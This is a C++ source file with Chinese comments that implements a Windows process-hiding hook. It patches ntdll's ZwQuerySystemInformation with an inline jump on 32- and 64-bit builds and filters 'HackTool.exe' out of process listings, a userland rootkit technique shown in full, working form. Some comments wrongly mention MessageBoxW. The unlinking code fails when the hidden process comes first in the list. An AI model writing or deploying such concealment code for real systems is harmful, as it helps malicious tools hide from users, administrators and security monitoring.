#include "pch.h"
#include "CHideProcess.h"

typedef NTSTATUS(WINAPI* typedef_ZwQuerySystemInformation)(
	_In_      SYSTEM_INFORMATION_CLASS SystemInformationClass,
	_Inout_   PVOID                     SystemInformation,
	_In_      ULONG                      SystemInformationLength,
	_Out_opt_ PULONG                   ReturnLength);

BYTE g_oldcode32_ZwQ[5] = { 0 };
BYTE g_oldcode64_ZwQ[12] = { 0 };


// 开启InlineHook
void OnInlineHook()
{
	// 1.获取函数地址
	HMODULE hModule = LoadLibraryA("ntdll.dll");
	typedef_ZwQuerySystemInformation ZwQuerySystemInformation =
		(typedef_ZwQuerySystemInformation)GetProcAddress(hModule, "ZwQuerySystemInformation");

	// 32位修改5个字节，64位修改12个字节
#ifndef _WIN64
	// jmp New_ZwQuerySystemInformation
	// 机器码位：e9 _dwOffset(跳转偏移)
	//          addr1 --> jmp _dwNewAddress指令的下一条指令的地址，即eip的值
	//          addr2 --> 跳转地址的值，即_dwNewAddress的值
	//          跳转偏移 _dwOffset = addr2 - addr1
	BYTE g_newcode[5] = { 0xE9 };
	// 2. 保存原始指令5个字节
	memcpy(g_oldcode32_ZwQ, ZwQuerySystemInformation, 5);

	// 3. 计算跳转偏移，构建跳转 newcode[5]
	// 跳转偏移  = 目标地址 - 指令所在- 指令长度
	DWORD dwOffset = (DWORD)MyZwQuerySystemInformation - (DWORD)ZwQuerySystemInformation - 5;
	*(DWORD*)(g_newcode + 1) = dwOffset;
#else
	// mov rax,0x1122334455667788
	// jmp rax
	// 机器码是：
	//      48 b8 8877665544332211
	//      ff e0
	BYTE g_newcode[12] = { 0x48, 0xb8, 0, 0, 0, 0, 0, 0, 0, 0, 0xff, 0xe0 };
	// 2. 保存原始指令12个字节
	memcpy(g_oldcode64_ZwQ, ZwQuerySystemInformation, 12);
	// 3. 构建跳转 newcode[12]
	ULONGLONG dwOffset = (ULONGLONG)MyZwQuerySystemInformation;
	*(ULONGLONG*)(g_newcode + 2) = dwOffset;
#endif // !_WIN64

	// 4. 写入跳转偏移
	// 修改目标页属性
	DWORD dwOldProtect;
	VirtualProtect(ZwQuerySystemInformation, sizeof(g_newcode), PAGE_EXECUTE_READWRITE, &dwOldProtect);
	// 修改MessageBoxW指令前5个字节
	memcpy(ZwQuerySystemInformation, g_newcode, sizeof(g_newcode));
	// 恢复页属性
	VirtualProtect(ZwQuerySystemInformation, sizeof(g_newcode), dwOldProtect, &dwOldProtect);
}


// 关闭InlineHook
void UnInlineHook()
{
	// 还原MessageBoxW前5个字节
	// 1.获取函数地址
	HMODULE hModule = LoadLibraryA("ntdll.dll");
	typedef_ZwQuerySystemInformation ZwQuerySystemInformation =
		(typedef_ZwQuerySystemInformation)GetProcAddress(hModule, "ZwQuerySystemInformation");

	// 2.还原指令前5字节
	// 修改目标页属性
	DWORD dwOldProtect;
	VirtualProtect(ZwQuerySystemInformation, 12, PAGE_EXECUTE_READWRITE, &dwOldProtect);
	// 32位下还原前5字节，64位下还原前12字节
#ifndef _WIN64
	// 修改函数指令前5个字节
	memcpy(ZwQuerySystemInformation, g_oldcode32_ZwQ, 5);
#else
	// 修改函数指令前12个字节
	memcpy(ZwQuerySystemInformation, g_oldcode64_ZwQ, 12);
#endif  // !_WIN64

	// 恢复页属性
	VirtualProtect(ZwQuerySystemInformation, 12, dwOldProtect, &dwOldProtect);
}

// hook后的新代码
//特别注意要加上调用方式 WINAPI
NTSTATUS WINAPI MyZwQuerySystemInformation(
	SYSTEM_INFORMATION_CLASS SystemInformationClass,
	PVOID SystemInformation,
	ULONG SystemInformationLength,
	PULONG ReturnLength
)
{
	NTSTATUS status = 0;

	PSYSTEM_PROCESS_INFORMATION pCur = NULL, pPrev = NULL;

	// 要隐藏的进程名
	wchar_t dwHideProcessName[MAX_PATH] = L"HackTool.exe";

	// 卸载钩子
	UnInlineHook();

	// 1.获取函数地址
	HMODULE hModule = LoadLibraryA("ntdll.dll");
	typedef_ZwQuerySystemInformation ZwQuerySystemInformation =
		(typedef_ZwQuerySystemInformation)GetProcAddress(hModule, "ZwQuerySystemInformation");
	if (NULL == ZwQuerySystemInformation)
	{
		return status;
	}
	// 调用原函数 ZwQuerySystemInformation
	status = ZwQuerySystemInformation(SystemInformationClass, SystemInformation,
		SystemInformationLength, ReturnLength);
	//  如果是检索系统的进程信息并且调用原函数成功
	if (NT_SUCCESS(status) && 5 == SystemInformationClass)
	{
		pCur = (PSYSTEM_PROCESS_INFORMATION)SystemInformation;
		while (TRUE)
		{
			// 判断是否是要隐藏的进程PID
			// 如果是要隐藏的进程PID
			if (lstrcmp(pCur->ImageName.Buffer, dwHideProcessName) == 0)
			{
				if (0 == pCur->NextEntryOffset)
				{
					//当我们需要隐藏的进程是最后一个数据时
					//就将上一个数据结构的NextEntryOffset置0
					//这时系统在遍历我们进程时就不会发现了
					pPrev->NextEntryOffset = 0;
				}
				else
				{
					//当我们需要隐藏的进程 后面还有进程时
					//越过要隐藏的进程让 NextEntryOffset 
					//指向下一个数据块
					pPrev->NextEntryOffset = pPrev->NextEntryOffset + pCur->NextEntryOffset;
				}
				//多个PID比较时，这里千万要去掉
				break;
			}

			if (0 == pCur->NextEntryOffset)
			{
				break;
			}
			pPrev = pCur;
			pCur = (PSYSTEM_PROCESS_INFORMATION)((BYTE *)pCur + pCur->NextEntryOffset);
		}
	}

	//设置钩子
	OnInlineHook();

	return status;
}